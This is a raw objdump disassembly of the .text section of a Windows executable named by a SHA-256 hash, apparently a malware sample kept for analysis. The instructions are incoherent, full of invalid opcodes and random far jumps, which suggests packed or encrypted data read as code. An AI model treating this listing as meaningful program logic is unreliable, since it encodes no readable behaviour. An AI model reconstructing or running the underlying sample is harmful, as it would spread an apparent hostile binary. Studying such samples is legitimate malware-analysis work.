
91a7cd36ad277489b66b0b820878122540f6a1f8161055ec9200c053840ec8d2.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	ror    DWORD PTR [ebp-0x7c],cl
  411003:	cli    
  411004:	xor    edx,edi
  411006:	pop    ebx
  411007:	push   eax
  411008:	mov    al,0xab
  41100a:	jns    0x410fae
  41100c:	ins    DWORD PTR es:[edi],dx
  41100d:	push   ebx
  41100e:	xor    eax,0xbd8cc5da
  411013:	repnz or al,BYTE PTR [edx+0x5e1b28f9]
  41101a:	and    al,0x75
  41101c:	xchg   esp,eax
  41101d:	or     al,0x59
  41101f:	unpcklps xmm0,XMMWORD PTR [esi+0x53]
  411023:	push   ebp
  411024:	call   0x81c4:0xb76dd52b
  41102b:	call   0x94b88399
  411030:	or     al,0x97
  411032:	pop    esp
  411033:	cdq    
  411034:	fimul  WORD PTR [esp+ebp*4+0x5f]
  411038:	add    DWORD PTR [ebx],ebx
  41103a:	ret    0xc9fb
  41103d:	std    
  41103e:	cmp    BYTE PTR [ecx-0x60],dh
  411041:	in     eax,dx
  411042:	and    BYTE PTR [eax-0x15780f68],dh
  411048:	test   eax,0x85e27571
  41104d:	clc    
  41104e:	or     bh,BYTE PTR [ecx+ebx*2-0x769d06aa]
  411055:	mov    dl,0xe4
  411057:	mov    edi,0x20979eb3
  41105c:	dec    edi
  41105d:	push   ebx
  41105e:	int3   
  41105f:	leave  
  411060:	push   eax
  411061:	loopne 0x41103e
  411063:	xchg   BYTE PTR [ebx-0x5685e0c3],bl
  411069:	inc    esi
  41106a:	faddp  st(5),st
  41106c:	lahf   
  41106d:	or     eax,0x3911621f
  411072:	fcomp  DWORD PTR [ebx*4-0x7ef2ecd0]
  411079:	inc    edx
  41107a:	and    cl,BYTE PTR [edi-0x1d8aa6e7]
  411080:	mov    esi,0x61e2ff69
  411085:	out    dx,eax
  411086:	icebp  
  411087:	and    al,0xa8
  411089:	add    al,0xf9
  41108b:	aad    0xea
  41108d:	push   ecx
  41108e:	cmp    al,0xe6
  411090:	cmp    esp,DWORD PTR [eax+0x4b7d9e9e]
  411096:	sbb    dh,BYTE PTR [ecx+0x29]
  411099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41109a:	push   ecx
  41109b:	ret    
  41109c:	test   edi,eax
  41109e:	or     eax,0x47fa525d
  4110a3:	retf   
  4110a4:	addr16 xor eax,0xaf0e40d3
  4110aa:	mov    bh,BYTE PTR [edx+0x2bb9e8dc]
  4110b0:	xchg   esi,eax
  4110b1:	sbb    al,0x6f
  4110b3:	pop    edi
  4110b4:	or     ebx,DWORD PTR [esi+0xf]
  4110b7:	ins    DWORD PTR es:[edi],dx
  4110b8:	and    BYTE PTR [ecx-0x1ddca15],al
  4110be:	add    cl,cl
  4110c0:	retf   0xa3f4
  4110c3:	inc    ecx
  4110c4:	test   BYTE PTR [edx+0x22],ch
  4110c7:	mov    ch,0x90
  4110c9:	dec    eax
  4110ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110cb:	inc    esp
  4110cc:	cmove  edx,DWORD PTR [esi-0x38]
  4110d0:	jmp    0xcd4a:0x76f8a877
  4110d7:	adc    DWORD PTR [eax],esp
  4110d9:	(bad)  
  4110da:	je     0x41107e
  4110dc:	std    
  4110dd:	mov    esp,0xb6f614f7
  4110e2:	add    esp,DWORD PTR [edx-0x79]
  4110e5:	dec    ebp
  4110e6:	daa    
  4110e7:	shr    BYTE PTR [edx+ebx*4],1
  4110ea:	add    edx,esi
  4110ec:	xchg   edx,eax
  4110ed:	xchg   esi,eax
  4110ee:	adc    al,0xeb
  4110f0:	daa    
  4110f1:	pop    ecx
  4110f2:	mov    esp,0x9b66c510
  4110f7:	and    ebx,DWORD PTR [edx+0x5142e02b]
  4110fd:	cmp    al,0x27
  4110ff:	jns    0x411093
  411101:	and    eax,edx
  411103:	sub    ebp,0x38
  411106:	xor    dl,BYTE PTR [ecx]
  411108:	pop    eax
  411109:	mov    esp,0x3f6c9e5f
  41110e:	stos   DWORD PTR es:[edi],eax
  41110f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411110:	xor    al,0xd7
  411112:	aad    0xe2
  411114:	mov    dl,0xbb
  411116:	pushf  
  411117:	aam    0x45
  411119:	sub    DWORD PTR [eax-0x22],edx
  41111c:	fdivr  st,st(3)
  41111e:	or     BYTE PTR [edx+0x12],0x44
  411122:	pop    ecx
  411123:	pop    ds
  411124:	fiadd  WORD PTR [edi+0x5258ebec]
  41112a:	in     eax,0xe3
  41112c:	ds cmovg ecx,edx
  411130:	pop    edi
  411131:	mov    ebx,0x998c73bf
  411136:	js     0x41118b
  411138:	push   edx
  411139:	int3   
  41113a:	pusha  
  41113b:	xchg   esp,eax
  41113c:	loopne 0x411104
  41113e:	jge    0x4110c6
  411140:	imul   edi,DWORD PTR [edx],0xe840caba
  411146:	push   ecx
  411147:	mov    esp,0x12f8f0cc
  41114c:	and    al,0x5d
  41114e:	push   ebx
  41114f:	or     eax,0xf70d9fe4
  411154:	sub    ebp,DWORD PTR [edi-0x58]
  411157:	faddp  st(7),st
  411159:	enter  0xad85,0xb0
  41115d:	push   esp
  41115e:	mov    eax,ds:0x225c3ab6
  411163:	ins    BYTE PTR es:[edi],dx
  411164:	retf   0xcc10
  411167:	inc    edi
  411168:	sub    cl,BYTE PTR [ecx+0x33265a09]
  41116e:	adc    DWORD PTR [edi+ebp*4+0x1d],esp
  411172:	push   ebp
  411173:	jae    0x411148
  411175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411176:	pop    es
  411177:	stos   BYTE PTR es:[edi],al
  411178:	addr16 (bad) 
  41117a:	call   0xc2da:0xd726d382
  411181:	inc    esp
  411182:	in     eax,dx
  411183:	xor    ebp,DWORD PTR [eax-0x18]
  411186:	sar    DWORD PTR [esi],1
  411188:	lock fsubr st(3),st
  41118b:	sbb    al,0x5d
  41118d:	out    0xf,eax
  41118f:	inc    ebp
  411190:	xchg   esp,eax
  411191:	in     al,0xec
  411193:	icebp  
  411194:	sub    bl,BYTE PTR [eax+0x65]
  411197:	stc    
  411198:	call   0x1657:0x19f13f54
  41119f:	pushf  
  4111a0:	mov    ebp,0x79a9b18d
  4111a5:	aaa    
  4111a6:	push   esi
  4111a7:	mov    ch,0xf
  4111a9:	imul   esi,DWORD PTR [ebp-0x220b4453],0xffffffae
  4111b0:	imul   ecx,DWORD PTR [eax-0x32],0xc2aefd31
  4111b7:	int    0x41
  4111b9:	or     dh,BYTE PTR [ecx]
  4111bb:	mov    eax,ds:0x24091686
  4111c0:	push   ebp
  4111c1:	call   0x8f2e:0x32e5793
  4111c8:	mov    ch,0xc9
  4111ca:	jno    0x411240
  4111cc:	sbb    edx,edx
  4111ce:	or     al,BYTE PTR [edi+0x6192b9d7]
  4111d4:	aam    0x71
  4111d6:	xchg   DWORD PTR [edx+0x29],edx
  4111d9:	adc    BYTE PTR [esi-0x7ac6c353],dh
  4111df:	mov    ebx,0xc7b23aa
  4111e4:	push   ds
  4111e5:	lds    edx,FWORD PTR [esi-0x1]
  4111e8:	in     eax,0x18
  4111ea:	fmul   DWORD PTR [ebx-0x27]
  4111ed:	mov    bl,BYTE PTR [ebx]
  4111ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111f0:	dec    ebx
  4111f1:	std    
  4111f2:	repnz sahf 
  4111f4:	test   DWORD PTR [ebx+eax*2+0x13368271],ebx
  4111fb:	fs inc ecx
  4111fd:	pop    ebx
  4111fe:	out    0xf9,eax
  411200:	jp     0x411240
  411202:	xchg   edi,eax
  411203:	xchg   edi,eax
  411204:	nop
  411205:	xor    eax,0x220bab9b
  41120a:	mov    fs,WORD PTR [edx+0xd67ec11]
  411210:	sbb    al,0x4a
  411212:	pop    esi
  411213:	cmc    
  411214:	pop    esi
  411215:	(bad)  
  411216:	sahf   
  411217:	sub    DWORD PTR [ebx],eax
  411219:	mov    esp,0x74fa77fd
  41121e:	xchg   esp,eax
  41121f:	aad    0xba
  411221:	jge    0x4111e3
  411223:	loop   0x411296
  411225:	cli    
  411226:	popa   
  411227:	mov    ebx,0x3733f6c7
  41122c:	ret    
  41122d:	jns    0x4112a5
  41122f:	jnp    0x4111d4
  411231:	in     eax,dx
  411232:	pushf  
  411233:	sub    ch,BYTE PTR [esi-0x7cf24e21]
  411239:	mov    ecx,0xf8b8edce
  41123e:	jmp    0x9dd66ac9
  411243:	push   0xaccce674
  411248:	mov    cl,0xc
  41124a:	in     eax,0x4a
  41124c:	xor    esp,DWORD PTR [edx]
  41124e:	xor    ch,BYTE PTR [edi+0x7db1fffb]
  411254:	dec    esi
  411255:	push   ebp
  411256:	add    al,0xd5
  411258:	mov    al,ds:0x38854092
  41125d:	push   edx
  41125e:	cmc    
  41125f:	adc    eax,0x9ccf3ccf
  411264:	push   0xffffff8e
  411266:	add    ebp,DWORD PTR [ecx+0x6f]
  411269:	mov    cl,0xa4
  41126b:	mov    al,0xd4
  41126d:	add    dh,BYTE PTR [edi]
  41126f:	sub    eax,0xaf42e7ae
  411274:	ins    BYTE PTR es:[edi],dx
  411275:	fwait
  411276:	lock retf 0xd4d4
  41127a:	icebp  
  41127b:	pushf  
  41127c:	int3   
  41127d:	push   0x1425bf40
  411282:	(bad)  
  411283:	push   ecx
  411284:	inc    ebp
  411285:	pop    ds
  411286:	cld    
  411287:	mov    al,BYTE PTR [ecx]
  411289:	mov    ax,0x476d
  41128d:	mov    esi,0xf0f37528
  411292:	ins    BYTE PTR es:[edi],dx
  411293:	sub    dh,dl
  411295:	mov    ds:0xd2f7e9f1,eax
  41129a:	test   DWORD PTR [edi+0x73],0x5bcb0e46
  4112a1:	mov    ch,0x73
  4112a3:	ins    BYTE PTR es:[edi],dx
  4112a4:	adc    DWORD PTR [ebx],ebx
  4112a6:	cmp    bl,ah
  4112a8:	(bad)  
  4112a9:	or     al,0xf2
  4112ab:	adc    DWORD PTR [esi+0x63],ebp
  4112ae:	shr    esp,0x2c
  4112b1:	icebp  
  4112b2:	daa    
  4112b3:	loope  0x4112d9
  4112b5:	xchg   ecx,eax
  4112b6:	aad    0xf
  4112b8:	addr16 popa 
  4112ba:	mov    ecx,DWORD PTR [esi+0x55]
  4112bd:	(bad)  
  4112be:	shl    al,cl
  4112c0:	scas   al,BYTE PTR es:[edi]
  4112c1:	mov    ecx,0x618d09b0
  4112c6:	lods   eax,DWORD PTR ds:[esi]
  4112c7:	ret    
  4112c8:	call   0x40269798
  4112cd:	sbb    eax,0x70814375
  4112d2:	mov    ds:0x37bafe4c,al
  4112d7:	xchg   esp,eax
  4112d8:	add    BYTE PTR [edi],cl
  4112da:	nop
  4112db:	sub    DWORD PTR [eax-0x7b],edi
  4112de:	jl     0x4112c6
  4112e0:	test   BYTE PTR [ecx+ebp*1],cl
  4112e3:	jge    0x4112e7
  4112e5:	xlat   BYTE PTR ds:[ebx]
  4112e6:	pop    edi
  4112e7:	test   DWORD PTR [edi],edx
  4112e9:	add    DWORD PTR [ebx],eax
  4112eb:	xchg   BYTE PTR [edx],al
  4112ed:	mov    BYTE PTR [esi],0xc8
  4112f0:	xchg   esp,eax
  4112f1:	inc    ch
  4112f3:	in     al,0xc1
  4112f5:	push   0x5f
  4112f7:	adc    eax,0x67b212a
  4112fc:	jae    0x4112d4
  4112fe:	hlt    
  4112ff:	mov    ebp,0x9075e86
  411304:	mov    al,0x5f
  411306:	test   ebp,esi
  411308:	call   0x8a54:0xc86d7cbf
  41130f:	mov    BYTE PTR [ebp+0x50],bl
  411312:	fwait
  411313:	nop
  411314:	cli    
  411315:	in     eax,dx
  411316:	call   0x3edd6451
  41131b:	daa    
  41131c:	mov    esp,0x3132d224
  411321:	outs   dx,DWORD PTR ds:[esi]
  411322:	xchg   DWORD PTR [ebp-0x46],edx
  411325:	pop    esi
  411326:	sar    ebp,1
  411328:	call   0x45aa3c5c
  41132d:	retf   0xb398
  411330:	sub    eax,0xca70a09e
  411335:	dec    edi
  411336:	inc    eax
  411337:	rcl    BYTE PTR [ebp+0x7a],cl
  41133a:	mov    esi,0x76976da0
  41133f:	xchg   BYTE PTR [ebx+0x56],cl
  411342:	inc    edx
  411343:	mov    WORD PTR [ecx+0x2ec7ffc0],?
  411349:	nop
  41134a:	dec    edi
  41134b:	dec    eax
  41134c:	ins    DWORD PTR es:[edi],dx
  41134d:	cmp    eax,0xae5a1b95
  411352:	jo     0x4112ef
  411354:	(bad)
  411357:	xor    DWORD PTR [edx+0x7f],edi
  41135a:	add    eax,0x583b010f
  41135f:	sbb    al,0x2f
  411361:	push   eax
  411362:	jg     0x4113a1
  411364:	popf   
  411365:	test   DWORD PTR [edx],edi
  411367:	cmp    BYTE PTR [edi],al
  411369:	dec    edx
  41136a:	rol    esp,0xcf
  41136d:	xchg   ecx,eax
  41136e:	cmp    eax,0x3da10633
  411373:	pop    ds
  411374:	loopne 0x4113c1
  411376:	sbb    BYTE PTR [esi+0x1d1b3c2e],0xd9
  41137d:	std    
  41137e:	(bad)  
  41137f:	mov    ebx,0x1a8ae0c7
  411384:	jae    0x4113a8
  411386:	ror    DWORD PTR [ebp*4+0xfb64a71],1
  41138d:	clc    
  41138e:	pop    ecx
  41138f:	pop    ds
  411390:	lods   al,BYTE PTR ds:[esi]
  411391:	mov    al,ds:0x858bdfd0
  411396:	mov    ecx,DWORD PTR [ebp+edi*2-0x67793ced]
  41139d:	mov    al,ds:0x30340ffa
  4113a2:	call   0x9535:0xfc9422b
  4113a9:	xchg   edx,eax
  4113aa:	pop    ebx
  4113ab:	jns    0x4113c4
  4113ad:	or     dl,dl
  4113af:	push   edx
  4113b0:	hlt    
  4113b1:	mov    ah,0xa2
  4113b3:	cmp    esp,ebp
  4113b5:	pop    ecx
  4113b6:	xchg   DWORD PTR [ebx],edx
  4113b8:	fadd   DWORD PTR [edi+0x5d09aa61]
  4113be:	push   esp
  4113bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113c0:	cmp    BYTE PTR [ebx+0x58],0x73
  4113c4:	mov    cl,0x7e
  4113c6:	mov    al,ds:0x80801c60
  4113cb:	jmp    0x8f63:0x779bc8a6
  4113d2:	cld    
  4113d3:	xor    eax,0x2a931b04
  4113d8:	cmp    BYTE PTR [esi+0x45],al
  4113db:	fs mov bl,0xb
  4113de:	mov    dh,0xaa
  4113e0:	xor    al,0xda
  4113e2:	frstor [ecx]
  4113e4:	xchg   BYTE PTR [esi-0x647b8943],bl
  4113ea:	addr16 inc ebp
  4113ec:	mov    ah,0x93
  4113ee:	jecxz  0x41137a
  4113f0:	cmp    bl,BYTE PTR [eax+edi*4+0x4a595b63]
  4113f7:	mov    ds:0xf9913f37,al
  4113fc:	fs pop ebp
  4113fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113ff:	xchg   ecx,eax
  411400:	call   FWORD PTR ds:0x28bd439b
  411406:	call   DWORD PTR [ebx+0x5fbaf9b1]
  41140c:	inc    ebp
  41140d:	mov    ds:0x48fe16e4,eax
  411412:	imul   edi,DWORD PTR [ebx],0xc637310e
  411418:	add    DWORD PTR [edx+edx*4-0x2b],0x2c
  41141d:	mov    ebx,0x44901365
  411422:	xchg   ecx,eax
  411423:	mov    ebx,0xf37aad03
  411428:	enter  0xc3c2,0xad
  41142c:	cmp    ecx,DWORD PTR [edi]
  41142e:	test   ebp,ebx
  411430:	mov    eax,ds:0x8fe8b3a5
  411435:	sbb    al,0x97
  411437:	cli    
  411438:	pushf  
  411439:	xor    dl,bh
  41143b:	fstp   QWORD PTR [edx+ebx*4+0x37dc5693]
  411442:	fst    st(7)
  411444:	cdq    
  411445:	outs   dx,BYTE PTR ds:[si]
  411447:	ss int 0x84
  41144a:	ret    
  41144b:	xchg   ebx,eax
  41144c:	pop    edi
  41144d:	stos   DWORD PTR es:[edi],eax
  41144e:	add    al,bl
  411450:	fistp  DWORD PTR [esi-0x47]
  411453:	inc    eax
  411454:	jecxz  0x411495
  411456:	and    eax,0xa94a6e1b
  41145b:	pop    eax
  41145c:	cmp    al,0x15
  41145e:	jb     0x4114c5
  411460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411461:	dec    esi
  411462:	adc    BYTE PTR [ebp+0x419776a5],0x10
  411469:	pushf  
  41146a:	(bad)  
  41146b:	pop    ecx
  41146c:	retf   
  41146d:	xor    eax,0x641e3424
  411472:	xor    dl,ch
  411474:	adc    edx,DWORD PTR [esi+0x3516a9ba]
  41147a:	sbb    BYTE PTR [edi+0x64],ah
  41147d:	mov    esp,0x5956ba86
  411482:	les    esi,FWORD PTR [edx+0xf975169]
  411488:	ds idiv cl
  41148b:	jns    0x411417
  41148d:	jle    0x41141f
  41148f:	es aam 0xa3
  411492:	cmp    esi,0xffffff9f
  411495:	pusha  
  411496:	nop
  411497:	ret    0x983f
  41149a:	mov    es,WORD PTR [edi+eax*1-0x5656dd4d]
  4114a1:	dec    edi
  4114a2:	inc    ebx
  4114a3:	fstp   QWORD PTR [eax-0x35]
  4114a6:	push   0x49
  4114a8:	xor    BYTE PTR [esi],ah
  4114aa:	push   edx
  4114ab:	cmp    eax,DWORD PTR [ecx]
  4114ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114ae:	mov    al,ds:0x43b6b7e6
  4114b3:	push   ecx
  4114b4:	push   esp
  4114b5:	test   eax,0x58555664
  4114ba:	mov    ch,0x8e
  4114bc:	xchg   ebx,eax
  4114bd:	popf   
  4114be:	iret   
  4114bf:	jmp    0xe91fb6cd
  4114c4:	mov    al,ds:0xadb0de11
  4114c9:	data16 lahf 
  4114cb:	sbb    al,0x37
  4114cd:	call   0x87af:0xb7973c31
  4114d4:	mov    al,0x81
  4114d6:	frstor [esi-0x4ec8bb1]
  4114dc:	jno    0x411492
  4114de:	int3   
  4114df:	mov    edx,0xf96075da
  4114e4:	mov    dl,bl
  4114e6:	imul   esi,ebp,0xffffffee
  4114e9:	lock push edx
  4114eb:	je     0x411561
  4114ed:	and    edi,DWORD PTR ds:0xd44a474e
  4114f3:	stos   DWORD PTR es:[edi],eax
  4114f4:	push   edi
  4114f5:	xor    dh,BYTE PTR [eax-0x4a1e08f4]
  4114fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114fc:	aas    
  4114fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114ff:	loopne 0x41156b
  411501:	js     0x411555
  411503:	ja     0x411572
  411505:	rcpps  xmm3,xmm0
  411508:	lahf   
  411509:	mov    al,0xb2
  41150b:	std    
  41150c:	test   BYTE PTR [esi-0x38],bh
  41150f:	sahf   
  411510:	adc    ecx,DWORD PTR [ebx-0x29]
  411513:	daa    
  411514:	repnz pop eax
  411516:	and    ecx,DWORD PTR [ebx+0x18]
  411519:	(bad)  
  41151a:	int    0x42
  41151c:	and    al,0xba
  41151e:	cmp    cl,BYTE PTR [edi+0x3]
  411521:	ja     0x4114c0
  411523:	cmc    
  411524:	iret   
  411525:	pusha  
  411526:	sub    ebx,0xfffffff5
  411529:	out    0x72,eax
  41152b:	(bad)
  41152e:	imul   ecx,DWORD PTR [edx+0x2f56065f],0x19ba7dc2
  411538:	pop    edx
  411539:	stc    
  41153a:	repz adc DWORD PTR gs:[ecx+0x4d74468b],0xffffffa6
  411543:	retf   0xc3d7
  411546:	aad    0xc5
  411548:	xchg   ebx,eax
  411549:	out    0x53,eax
  41154b:	xor    eax,0xd852e013
  411550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411551:	sub    esp,edi
  411553:	xor    BYTE PTR [ebp-0x70bb5e4a],bh
  411559:	imul   edi,DWORD PTR [esi+0x22],0x177631aa
  411560:	dec    BYTE PTR ds:0xbb3f1279
  411566:	shr    DWORD PTR [ebp+0x4bc03d6a],0x9a
  41156d:	mov    ds:0x92b1610b,al
  411572:	mov    ds:0x20a2696a,eax
  411577:	adc    DWORD PTR [edi+0x6a],esi
  41157a:	mov    ah,0x8b
  41157c:	and    dl,BYTE PTR [edx]
  41157e:	add    esp,DWORD PTR ds:0xa29b191e
  411584:	ret    
  411585:	xor    BYTE PTR [edx-0x18],bh
  411588:	test   al,0x50
  41158a:	out    dx,al
  41158b:	sar    DWORD PTR [edx+0x2a64b477],1
  411591:	out    dx,eax
  411592:	mov    dl,0xad
  411594:	jno    0x41152a
  411596:	ror    BYTE PTR [eax],0xff
  411599:	push   cs
  41159a:	jbe    0x4115c0
  41159c:	icebp  
  41159d:	loopne 0x411560
  41159f:	scas   al,BYTE PTR es:[edi]
  4115a0:	add    DWORD PTR [ebx+0x45b2a9d5],eax
  4115a6:	pop    ebp
  4115a7:	push   0xb701d2e7
  4115ac:	(bad)  
  4115ad:	scas   al,BYTE PTR es:[edi]
  4115ae:	mov    al,ds:0x9ba27ee5
  4115b3:	fiadd  WORD PTR [eax+ebp*2]
  4115b6:	xor    BYTE PTR [eax-0x6],dh
  4115b9:	lock hlt 
  4115bb:	cmp    al,0xf1
  4115bd:	xor    cl,BYTE PTR [edi]
  4115bf:	mov    edi,0xe6c74678
  4115c4:	pop    es
  4115c5:	inc    edi
  4115c7:	dec    edi
  4115c8:	mov    eax,?
  4115ca:	(bad)  
  4115cb:	scas   al,BYTE PTR es:[edi]
  4115cc:	xchg   ebx,eax
  4115cd:	nop
  4115ce:	xchg   esp,eax
  4115cf:	dec    esp
  4115d0:	sbb    eax,0x70c8077f
  4115d5:	dec    edx
  4115d6:	adc    eax,0xfa01934b
  4115db:	sub    edx,DWORD PTR [ebx-0x66]
  4115de:	jp     0x411651
  4115e0:	rol    BYTE PTR [ecx-0x47ac237a],0x81
  4115e7:	push   ds
  4115e8:	in     eax,0x41
  4115ea:	mov    ebp,0x75c18bb1
  4115ef:	clc    
  4115f0:	push   es
  4115f1:	in     al,dx
  4115f2:	stos   BYTE PTR es:[edi],al
  4115f3:	jp     0x411586
  4115f5:	bound  ebx,QWORD PTR ds:0x6ed1b58
  4115fb:	xlat   BYTE PTR ds:[ebx]
  4115fc:	jne    0x4115e6
  4115fe:	sub    bh,0x96
  411601:	fnsave [esp+edi*1+0x39]
  411605:	mov    esp,0xfcd12ea8
  41160a:	daa    
  41160b:	into   
  41160c:	xchg   edi,eax
  41160d:	xchg   esp,eax
  41160e:	cmp    bh,bl
  411610:	stc    
  411611:	cli    
  411612:	cli    
  411613:	bound  edx,QWORD PTR [ecx-0x23b86bde]
  411619:	xor    eax,0x42e33d58
  41161e:	ret    
  41161f:	or     DWORD PTR [edx-0x4207db29],0x29cee6af
  411629:	mov    BYTE PTR [eax+0x3e],cl
  41162c:	mov    BYTE PTR cs:0xe7d64688,0xa1
  411634:	xor    ebx,DWORD PTR [edx+0x60]
  411637:	lea    esp,[ebx]
  411639:	or     al,BYTE PTR [ebx-0x6a]
  41163c:	xchg   BYTE PTR [ecx],cl
  41163e:	mov    bh,0x96
  411640:	test   DWORD PTR [ebp-0x48329f6b],eax
  411646:	jns    0x41168b
  411648:	aaa    
  411649:	sbb    dh,cl
  41164b:	dec    ebx
  41164c:	ficomp DWORD PTR [ebx-0x32f5c206]
  411652:	sub    edx,DWORD PTR [eax+edx*2-0x2c]
  411656:	js     0x411673
  411658:	mov    ecx,0xbb52a5d9
  41165d:	les    ebx,FWORD PTR [ebp+0x6cc28695]
  411663:	std    
  411664:	push   ss
  411665:	or     al,0xcf
  411667:	dec    ecx
  411668:	jo     0x41167d
  41166a:	sbb    BYTE PTR [eax-0x503d48f0],bl
  411670:	or     al,0xd1
  411672:	mov    ds:0x66d59205,eax
  411677:	push   0x612f4783
  41167c:	test   BYTE PTR ds:0xd0747a7c,bh
  411682:	popf   
  411683:	mov    ds:0x5411fac3,eax
  411688:	(bad)  
  411689:	fldenv fs:[esi]
  41168c:	mov    bl,0x2a
  41168e:	dec    ecx
  41168f:	pmaddwd mm6,QWORD PTR [edi+0x2d]
  411693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411694:	aas    
  411695:	jae    0x4116b1
  411697:	cli    
  411698:	sbb    al,0xd8
  41169a:	ins    BYTE PTR es:[edi],dx
  41169b:	mov    bh,0xb4
  41169d:	inc    ebp
  41169e:	and    DWORD PTR [ebp+esi*2+0x2e],edi
  4116a2:	rcr    BYTE PTR fs:[ebx],0x1f
  4116a6:	jle    0x41171f
  4116a8:	int    0x1b
  4116aa:	xor    dh,BYTE PTR [ebp-0x6f]
  4116ad:	nop
  4116ae:	jmp    0x411696
  4116b0:	cli    
  4116b1:	add    ebp,DWORD PTR [ebp+0x57]
  4116b4:	jmp    0xe8bd:0x5b43ddf8
  4116bb:	sbb    BYTE PTR [edx-0x28926814],cl
  4116c1:	mov    ds:0x4d9a063f,eax
  4116c7:	and    al,0xfd
  4116c9:	aaa    
  4116ca:	loop   0x411727
  4116cc:	lds    ecx,FWORD PTR es:[eax+0x55c7a4d0]
  4116d3:	add    al,BYTE PTR [edi]
  4116d5:	dec    edx
  4116d6:	faddp  st(3),st
  4116d8:	dec    eax
  4116d9:	push   ebx
  4116da:	fs cli 
  4116dc:	loope  0x41169f
  4116de:	xchg   esi,eax
  4116df:	leave  
  4116e0:	jnp    0x4116d9
  4116e2:	jl     0x411703
  4116e4:	and    bh,ah
  4116e6:	dec    esp
  4116e7:	je     0x411713
  4116e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116ea:	shl    DWORD PTR [ebx+0x2a],1
  4116ed:	and    esi,DWORD PTR [esi]
  4116ef:	scas   al,BYTE PTR es:[edi]
  4116f0:	(bad)  [ebx]
  4116f2:	fdivr  QWORD PTR [edx]
  4116f4:	push   es
  4116f5:	test   cx,bx
  4116f8:	add    dh,BYTE PTR [edi+0x48f4f26e]
  4116fe:	sub    al,0x7e
  411700:	das    
  411701:	jo     0x4116e5
  411703:	adc    DWORD PTR [ebp-0x7d],esp
  411706:	push   eax
  411707:	cmp    al,0xc5
  411709:	jns    0x4116f9
  41170b:	dec    ebx
  41170c:	rcl    BYTE PTR [ecx+0x11],cl
  41170f:	pop    ecx
  411710:	sub    dl,BYTE PTR [ecx]
  411712:	push   es
  411713:	inc    esi
  411714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411715:	inc    esi
  411716:	mov    al,0x35
  411718:	xor    eax,0xab849be7
  41171d:	shl    BYTE PTR [ecx],0xe9
  411720:	(bad)  
  411721:	ficomp WORD PTR [esi-0x5163bb74]
  411727:	loopne 0x411712
  411729:	xchg   esi,eax
  41172a:	sbb    DWORD PTR [esi-0x77c4f0e1],0xffffffa1
  411731:	mov    edi,es
  411733:	and    BYTE PTR [edi-0x30],dh
  411736:	mov    eax,ds:0xa84dca94
  41173b:	push   ebx
  41173c:	jl     0x411777
  41173e:	adc    DWORD PTR [eax-0xd339515],ecx
  411744:	or     esi,DWORD PTR es:0x609db9fe
  41174b:	jge    0x4117b8
  41174d:	dec    ecx
  41174e:	ret    
  41174f:	cmp    al,0x25
  411751:	cdq    
  411752:	mov    bh,0x17
  411754:	xchg   edi,eax
  411755:	add    eax,0xe558e342
  41175a:	or     DWORD PTR [edi-0x7c203485],edi
  411760:	sub    al,0x98
  411762:	cmp    ecx,edi
  411764:	push   es
  411765:	lods   eax,DWORD PTR ds:[esi]
  411766:	xor    eax,0x49ee4ede
  41176b:	dec    ebx
  41176c:	stos   BYTE PTR es:[edi],al
  41176d:	test   al,0x21
  41176f:	ins    BYTE PTR es:[edi],dx
  411770:	nop
  411771:	or     eax,DWORD PTR es:[edi]
  411774:	lock cmp al,0x8a
  411777:	xor    ebp,ecx
  411779:	inc    ecx
  41177a:	jl     0x41171e
  41177c:	aam    0x3
  41177e:	fld    QWORD PTR [ebp-0xc]
  411781:	jp     0x41176c
  411783:	or     bl,BYTE PTR [edx-0x3be0c231]
  411789:	daa    
  41178a:	scas   al,BYTE PTR es:[edi]
  41178b:	je     0x41178a
  41178d:	dec    edx
  41178e:	sbb    ebx,edi
  411790:	sbb    eax,0x889fe2f2
  411795:	lock jns 0x4117f8
  411798:	push   es
  411799:	(bad)  
  41179a:	lock dec esp
  41179c:	push   edx
  41179d:	rcr    DWORD PTR [esi],1
  41179f:	adc    bl,al
  4117a1:	push   ecx
  4117a2:	call   0xcc62d4dc
  4117a7:	test   eax,0xdf03e6c
  4117ac:	xchg   ecx,eax
  4117ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117ae:	mov    ebp,0x1c783413
  4117b3:	sub    DWORD PTR [ebx+esi*1-0x4958ba0],esp
  4117ba:	les    eax,FWORD PTR [ebx]
  4117bc:	aas    
  4117bd:	pop    ss
  4117be:	mov    bh,0x98
  4117c0:	sbb    eax,0x1cfcaba5
  4117c5:	pop    esi
  4117c6:	or     al,0x98
  4117c8:	cmp    ebp,ecx
  4117ca:	xchg   edi,eax
  4117cb:	pop    esi
  4117cc:	fdiv   QWORD PTR [edx+0x196afcaa]
  4117d2:	ins    BYTE PTR es:[edi],dx
  4117d3:	pop    edx
  4117d4:	mov    ds:0x509795c6,eax
  4117d9:	lods   al,BYTE PTR ds:[esi]
  4117da:	adc    BYTE PTR [eax],ch
  4117dc:	mov    esp,0xe82dc956
  4117e1:	push   es
  4117e2:	addr16 xchg edi,eax
  4117e4:	outs   dx,BYTE PTR ds:[esi]
  4117e5:	inc    edi
  4117e6:	nop
  4117e7:	inc    ebp
  4117e8:	stos   DWORD PTR es:[edi],eax
  4117e9:	xor    al,cl
  4117eb:	sbb    eax,0x5664e234
  4117f0:	mov    edx,0xa67b743d
  4117f5:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4117f7:	imul   ecx,eax,0xceb97945
  4117fd:	(bad)  
  4117fe:	mov    eax,DWORD PTR [ebx-0x3a953baf]
